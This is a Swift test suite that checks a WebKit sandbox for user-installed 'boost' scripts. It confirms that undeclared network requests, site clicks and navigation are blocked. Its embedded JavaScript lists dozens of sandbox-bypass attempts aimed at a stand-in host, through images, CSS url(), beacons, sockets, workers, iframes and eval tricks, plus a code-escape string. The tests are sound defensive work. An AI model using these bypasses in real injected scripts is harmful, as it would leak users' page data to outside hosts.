import AppKit
import Foundation
import Testing
import WebKit
@testable import Fast

/// Real WebKit DOM and separate page/boost worlds; all HTTP fetches are replaced
/// by a recorder before installing the production wrapper. No external server.
@MainActor @Suite(.serialized)
struct BoostNetworkTests {
    private func run(_ code: String, hosts: [String] = ["api.example.com"], checks: String? = nil, siteActions: [String]? = nil, url: String = "https://example.com/", configuration: WKWebViewConfiguration = WKWebViewConfiguration()) async throws -> (WKWebView, WKContentWorld) {
        _ = NSApplication.shared
        let web = WKWebView(frame: CGRect(x: 0, y: 0, width: 600, height: 400), configuration: configuration)
        web.loadHTMLString("<!doctype html><head></head><body><main>Fixture</main><img id='site-image'><iframe id='site-frame'></iframe></body>", baseURL: URL(string: url))
        var ready = false
        for _ in 0..<150 {
            ready = (try? await BoostJavaScript.evaluate("!!document.querySelector('main') && document.readyState === 'complete'", on: web)) as? Bool == true
            if ready { break }
            try await Task.sleep(for: .milliseconds(20))
        }
        try #require(ready, "The local WebKit document did not load")
        let world = WKContentWorld.world(name: "boost-security-" + UUID().uuidString)
        _ = try await BoostJavaScript.evaluate("""
        window.sent=[];
        window.fetch=(input,options)=>{ sent.push({url:input instanceof Request ? input.url : String(input),...options}); return Promise.resolve({ok:true}); };
        window.results=Object.create(null);
        window.attempt=(name,fn)=>{ try { fn(); results[name]=false; } catch(e) { results[name]=true; } };
        true;
        """, on: web, world: world)
        var files = BoostTests.pageFiles(hosts: hosts, siteActions: siteActions, code: code)
        if let checks { files["checks.js"] = checks }
        let package = try BoostPackage.read(id: "security", files: files, sites: ["example.com", "other.example.com"])
        let report = try await BoostJavaScript.evaluate(BoostScript.source(package), on: web, world: world) as? [String: Any]
        try #require(report?["loaded"] as? Bool == true, "\(String(describing: report))")
        try #require((report?["errors"] as? [String])?.isEmpty == true, "\(String(describing: report))")
        return (web, world)
    }

    private func result(_ web: WKWebView, _ world: WKContentWorld) async throws -> [String: Bool] {
        try #require(try await BoostJavaScript.evaluate("results", on: web, world: world) as? [String: Bool])
    }

    @Test func DOMLoadsAndAlternateTransportsCannotBypassFetch() async throws {
        let (web, world) = try await run(#"""
        const target='boost-audit://outside.invalid/collect';
        attempt('image',()=>{ const e=new Image(); e.src=target; });
        attempt('attribute',()=>document.createElement('img').setAttribute('src',target));
        attempt('namespaced',()=>document.createElementNS('http://www.w3.org/2000/svg','image').setAttributeNS('http://www.w3.org/1999/xlink','href',target));
        attempt('srcset',()=>{ const e=new Image(); e.srcset=target+' 1x'; });
        attempt('html',()=>{ document.querySelector('main').innerHTML='<img src="'+target+'">'; });
        attempt('adjacent',()=>document.body.insertAdjacentHTML('beforeend','<img src="'+target+'">'));
        attempt('css',()=>document.body.style.setProperty('background-image','url('+target+')'));
        { const i=document.createElement('img'); let n=0; i.setAttribute({toString(){return ++n===1 ? 'id' : 'src';}},target); results.mutableAttributeName=i.hasAttribute('id') && !i.hasAttribute('src'); }
        { const e=document.createElement('style'); document.head.append(e); let n=0; e.sheet.insertRule({toString(){return ++n===1 ? 'body{color:red}' : 'body{background:url('+target+')}';}}); results.mutableCSSRule=!e.sheet.cssRules[0].cssText.includes('url('); }
        attempt('styleInnerText',()=>{ const e=document.createElement('style'); document.head.append(e); e.innerText='body{background:url('+target+')}'; });
        attempt('styleRange',()=>{ const e=document.createElement('style'); e.textContent='body{}'; document.head.append(e); const r=document.createRange(); r.selectNodeContents(e); r.collapse(false); r.insertNode(document.createTextNode('body{background:url('+target+')}')); });
        attempt('styleHTML',()=>{ const e=document.createElement('style'); document.head.append(e); e.innerHTML='body{background:url('+target+')}'; });
        attempt('spoofedAttribute',()=>{ const a=document.createAttribute('src'); a.value=target; Object.defineProperty(a,'name',{value:'id'}); document.createElement('img').setAttributeNode(a); });
        attempt('spoofedStyle',()=>{ const e=document.createElement('style'); document.head.append(e); Object.defineProperty(e,'localName',{value:'div'}); e.textContent='body{background:url('+target+')}'; });
        attempt('styleReceiver',()=>Object.defineProperty(document.body.style,'receiver',{get(){return this;}}));
        attempt('stylePrototype',()=>Object.setPrototypeOf(document.body.style,{}));
        attempt('cssProperty',()=>{ document.body.style.backgroundImage='url('+target+')'; });
        attempt('cssText',()=>{ document.body.style.cssText='background:url('+target+')'; });
        attempt('styleText',()=>{ const e=document.createElement('style'); e.textContent='body{background:url('+target+')}'; document.head.append(e); });
        attempt('beacon',()=>navigator.sendBeacon(target,'fixture'));
        attempt('socket',()=>new WebSocket('wss://outside.invalid/'));
        attempt('events',()=>new EventSource(target));
        attempt('worker',()=>new Worker(target));
        attempt('xhr',()=>new XMLHttpRequest());
        attempt('audio',()=>new Audio(target));
        attempt('font',()=>new FontFace('fixture','url('+target+')'));
        attempt('svgProperty',()=>{ const e=document.createElementNS('http://www.w3.org/2000/svg','image'); e.href.baseVal=target; });
        attempt('styleCharacterData',()=>{ const e=document.createElement('style'); const t=document.createTextNode('body{}'); e.append(t); document.head.append(e); t.data='body{background:url('+target+')}'; });
        attempt('frame',()=>{ const e=document.createElement('iframe'); document.body.append(e); });
        attempt('freshRealm',()=>document.querySelector('#site-frame').contentWindow.fetch(target));
        attempt('inlineScript',()=>{ const e=document.createElement('script'); e.textContent='1'; document.body.append(e); });
        attempt('eventHandler',()=>document.body.setAttribute('onload','1'));
        attempt('form',()=>document.createElement('form').submit());
        attempt('popup',()=>window.open(target));
        attempt('constructor',()=>({}).constructor.constructor('return 1')());
        attempt('asyncConstructor',()=>Object.getPrototypeOf(async()=>{}).constructor('return 1')());
        attempt('stringTimer',()=>setTimeout('1',0));
        attempt('prototypeFetch',()=>{ let p=Object.getPrototypeOf(window); while(p) { if(Object.prototype.hasOwnProperty.call(p,'fetch')) { p.fetch.call(window,target); return; } p=Object.getPrototypeOf(p); } throw Error('No inherited fetch'); });
        attempt('closedFetch',()=>originalFetch(target));
        attempt('closedReach',()=>reach(target));
        """#)
        defer { web.stopLoading() }
        let results = try await result(web, world)
        #expect(results.count == 40)
        for (name, blocked) in results { #expect(blocked, "Bypass: \(name)") }
        // Patches belong to the boost's world; the site's APIs still work.
        let site = try await BoostJavaScript.evaluate("typeof XMLHttpRequest === 'function' && (()=>{ const i=document.querySelector('#site-image'); i.src='data:image/png;base64,'; return i.getAttribute('src') === 'data:image/png;base64,'; })()", on: web)
        #expect(site as? Bool == true)
    }

    @Test func undeclaredBoostCannotPressOrDispatchSiteActions() async throws {
        let (web, world) = try await run(#"""
        const button=document.createElement('button'); document.body.append(button);
        attempt('click',()=>button.click());
        attempt('dispatch',()=>button.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true})));
        attempt('customDispatch',()=>button.dispatchEvent(new Event('site-action')));
        """#)
        defer { web.stopLoading() }
        #expect(try await result(web, world).count == 3)
        #expect(try await result(web, world).values.allSatisfy { $0 })
    }

    @Test func declaredActionsStayInMatchedDocumentAndKeepAllTransportGuards() async throws {
        let (web, world) = try await run(#"""
        const button=document.createElement('button'); button.type='button'; document.body.append(button);
        window.pressed=0; button.addEventListener('click',()=>pressed++);
        button.click(); button.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true}));
        const foreign=document.implementation.createHTMLDocument('Other'); const other=foreign.createElement('button'); foreign.body.append(other);
        Object.defineProperty(other,'ownerDocument',{value:document});
        attempt('foreignDocument',()=>HTMLElement.prototype.click.call(other));
        attempt('foreignDispatch',()=>EventTarget.prototype.dispatchEvent.call(other,new MouseEvent('click',{cancelable:true})));
        const link=document.createElement('a'); document.body.append(link);
        for(const href of ['https://outside.invalid/','https://example.com.outside.invalid/','javascript:void(0)','data:text/html,fixture']) {
          if(href.startsWith('javascript:') || href.startsWith('data:')) { attempt(href,()=>{link.href=href;link.click();}); }
          else { link.href=href; attempt(href,()=>link.click()); }
        }
        link.href='/same-host'; link.target='_blank'; attempt('newContext',()=>link.click());
        link.target='_self'; attempt('uncancelable',()=>link.dispatchEvent(new MouseEvent('click')));
        const form=document.createElement('form'); const submit=document.createElement('button'); form.append(submit); document.body.append(form);
        attempt('submitClick',()=>submit.click()); attempt('submitDispatch',()=>form.dispatchEvent(new Event('submit',{cancelable:true})));
        attempt('form',()=>form.requestSubmit());
        attempt('fetch',()=>fetch('https://outside.invalid/'));
        attempt('fetchLocal',()=>originalFetch('https://outside.invalid/'));
        attempt('hostLocal',()=>hosts.push('outside.invalid'));
        attempt('realm',()=>document.body.append(document.createElement('iframe')));
        attempt('worker',()=>new Worker('/worker.js'));
        attempt('image',()=>{const i=new Image();i.src='https://outside.invalid/';});
        attempt('open',()=>window.open('https://outside.invalid/'));
        fetch('/allowed');
        """#, siteActions: ["clicks"])
        defer { web.stopLoading() }
        #expect(try await result(web, world).values.allSatisfy { $0 })
        #expect(try await BoostJavaScript.evaluate("pressed === 2 && sent.length === 1 && sent[0].url === 'https://example.com/allowed'", on: web, world: world) as? Bool == true)
    }

    @Test func siteActionsHaveNoDefaultNavigationEvenForDetachedAndShadowLinks() async throws {
        let (web, world) = try await run("", siteActions: ["clicks"])
        defer { web.stopLoading() }
        // Register in the site's world. Its handler rewrites href after the
        // grant check and stops propagation, defeating a late canceler.
        _ = try await BoostJavaScript.evaluate(#"""
        document.body.innerHTML='<a id="link" href="/safe">Link</a><a id="detached" href="/safe">Detached</a><div id="shadow"></div>';
        const root=document.querySelector('#shadow').attachShadow({mode:'open'}); root.innerHTML='<a href="/safe">Shadow</a>';
        document.body.dataset.actions='0';
        for(const link of [document.querySelector('#link'),document.querySelector('#detached'),root.firstChild]) link.addEventListener('click',event=>{
          document.body.dataset.actions=String(Number(document.body.dataset.actions)+1);
          link.href='https://outside.invalid/navigation';link.target='_blank';event.stopImmediatePropagation();
        }); true;
        """#, on: web)
        let navigation = NavigationProbe(); web.navigationDelegate = navigation
        _ = try await BoostJavaScript.evaluate(#"""
        document.querySelector('#link').click();
        const detached=document.querySelector('#detached');detached.remove();detached.click();
        document.querySelector('#shadow').shadowRoot.firstChild.click();true;
        """#, on: web, world: world)
        try await Task.sleep(for: .milliseconds(100))
        #expect(try await BoostJavaScript.evaluate("document.body.dataset.actions", on: web) as? String == "3")
        #expect(navigation.requests.isEmpty)
        #expect(web.url?.host == "example.com")
        withExtendedLifetime(navigation) {}
    }

    @MainActor private final class NavigationProbe: NSObject, WKNavigationDelegate {
        var requests: [URL] = []
        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction,
                     decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            if let url = navigationAction.request.url { requests.append(url) }
            decisionHandler(.cancel)
        }
    }

    @Test func declarationDoesNotGrantActionsOnUnmatchedHosts() async throws {
        let (web, world) = try await run("", checks: #"""
        const b=document.createElement('button'); document.body.append(b);
        attempt('otherHostClick',()=>b.click());
        attempt('otherHostDispatch',()=>b.dispatchEvent(new MouseEvent('click',{cancelable:true})));
        """#, siteActions: ["clicks"], url: "https://other.example.com/")
        defer { web.stopLoading() }
        #expect(try await result(web, world).count == 2)
        #expect(try await result(web, world).values.allSatisfy { $0 })
    }

    @Test func permissionReplacementCannotReuseAnEarlierGrant() async throws {
        let (web, world) = try await run("", siteActions: ["clicks"])
        defer { web.stopLoading() }
        let plain = try BoostPackage.read(id: "security", files: BoostTests.pageFiles(hosts: ["api.example.com"], code: "window.undeclaredRan=true;"), sites: ["example.com"])
        let report = try await BoostJavaScript.evaluate(BoostScript.source(plain), on: web, world: world) as? [String: Any]
        #expect(report?["error"] as? String == "Reload this page to change boost permissions.")
        #expect(try await BoostJavaScript.evaluate("window.undeclaredRan === undefined", on: web, world: world) as? Bool == true)
    }

    // The original untracked audit's collector, turned into a regression:
    // the synthetic marker must never reach the undeclared custom scheme.
    @Test func theOriginalDOMCollectorReceivesNothing() async throws {
        let collector = Collector()
        let configuration = WKWebViewConfiguration()
        configuration.websiteDataStore = .nonPersistent()
        configuration.setURLSchemeHandler(collector, forURLScheme: "boost-audit")
        let (web, world) = try await run(#"""
        attempt('fetch',()=>fetch('boost-audit://undeclared.test/fetch'));
        attempt('image',()=>{ const image=document.createElement('img'); image.src='boost-audit://undeclared.test/synthetic-marker'; document.body.appendChild(image); });
        """#, configuration: configuration)
        defer { web.stopLoading() }
        try await Task.sleep(for: .milliseconds(100))
        let results = try await result(web, world)
        #expect(results["fetch"] == true && results["image"] == true)
        #expect(collector.requests.isEmpty, "Undeclared collector received \(collector.requests)")
        // Existing site resources are unaffected by the isolated-world patch.
        _ = try await BoostJavaScript.evaluate("const i=new Image(); i.src='boost-audit://undeclared.test/site-resource'; document.body.append(i);", on: web)
        for _ in 0..<100 {
            if !collector.requests.isEmpty { break }
            try await Task.sleep(for: .milliseconds(10))
        }
        #expect(collector.requests.map(\.path) == ["/site-resource"])
    }

    @MainActor private final class Collector: NSObject, WKURLSchemeHandler {
        var requests: [URL] = []
        func webView(_ webView: WKWebView, start urlSchemeTask: WKURLSchemeTask) {
            if let url = urlSchemeTask.request.url { requests.append(url) }
            urlSchemeTask.didFailWithError(URLError(.resourceUnavailable))
        }
        func webView(_ webView: WKWebView, stop urlSchemeTask: WKURLSchemeTask) {}
    }

    @Test func fetchValidatesOnceAndEnforcesDeclaredHostPolicy() async throws {
        let (web, world) = try await run(#"""
        fetch('/api');
        fetch('https://api.example.com/data',{method:'POST',body:'{}',credentials:'include',headers:{'X-Secret':'fixture'}});
        attempt('foreign',()=>fetch('https://outside.invalid/data'));
        attempt('suffix',()=>fetch('https://api.example.com.outside.invalid/data'));
        attempt('port',()=>fetch('https://api.example.com:444/data'));
        attempt('http',()=>fetch('http://api.example.com/data'));
        attempt('credentials',()=>fetch('https://user:pass@api.example.com/data'));
        attempt('method',()=>fetch('https://api.example.com/data',{method:'DELETE'}));
        let n=0; fetch({toString(){ return ++n===1 ? 'https://example.com/safe' : 'https://outside.invalid/data'; }});
        """#)
        defer { web.stopLoading() }
        let results = try await result(web, world)
        #expect(results.count == 6 && results.values.allSatisfy { $0 })
        let sent = try #require(try await BoostJavaScript.evaluate("sent", on: web, world: world) as? [[String: Any]])
        #expect(sent.count == 3)
        #expect(sent[0]["url"] as? String == "https://example.com/api")
        #expect(sent[0]["redirect"] as? String == "error")
        #expect(sent[1]["credentials"] as? String == "omit")
        #expect(sent[1]["redirect"] as? String == "error")
        #expect(sent[1]["referrerPolicy"] as? String == "no-referrer")
        #expect((sent[1]["headers"] as? [String: String])?["X-Secret"] == nil)
        #expect(sent[2]["url"] as? String == "https://example.com/safe")
    }

    @Test func undoAndReplacementKeepNetworkGuardsAndOrdinaryDOMWorks() async throws {
        let code = #"""
        const label=document.createElement('span'); label.textContent='Boost works'; document.querySelector('main').append(label);
        document.body.style.color='red';
        window.retained=()=>{ const i=new Image(); i.src='https://outside.invalid/late'; };
        """#
        let (web, world) = try await run(code)
        defer { web.stopLoading() }
        _ = try await BoostJavaScript.evaluate(BoostScript.remove, on: web, world: world)
        _ = try await BoostJavaScript.evaluate("attempt('late',retained); attempt('fetchAfterUndo',()=>fetch('https://outside.invalid/late'));", on: web, world: world)
        #expect(try await result(web, world).values.allSatisfy { $0 })
        let package = try BoostPackage.read(id: "security", files: BoostTests.pageFiles(hosts: ["api.example.com"], code: "document.body.dataset.replaced='yes';"), sites: ["example.com"])
        let report = try await BoostJavaScript.evaluate(BoostScript.source(package), on: web, world: world) as? [String: Any]
        #expect((report?["errors"] as? [String])?.isEmpty == true)
        #expect(try await BoostJavaScript.evaluate("document.body.dataset.replaced", on: web, world: world) as? String == "yes")
    }

    @Test func scriptChecksCannotReachWrapperLocals() async throws {
        let (web, world) = try await run("", checks: "attempt('checkFetch',()=>originalFetch('https://outside.invalid/')); attempt('checkHosts',()=>hosts.push('outside.invalid'));")
        defer { web.stopLoading() }
        #expect(try await result(web, world).values.allSatisfy { $0 })
    }

    @Test func aScriptCannotEscapeItsFunctionBodyWhileBeingEmbedded() throws {
        var files = BoostTests.pageFiles(code: "}); window.escaped=true; (function(){")
        #expect(throws: Error.self) { try BoostPackage.read(id: "escape", files: files, sites: ["example.com"]) }
        files = BoostTests.pageFiles(code: "document.title = 'valid';")
        files["checks.js"] = "}); window.escaped=true; (function(){"
        #expect(throws: Error.self) { try BoostPackage.read(id: "escape", files: files, sites: ["example.com"]) }
    }
}
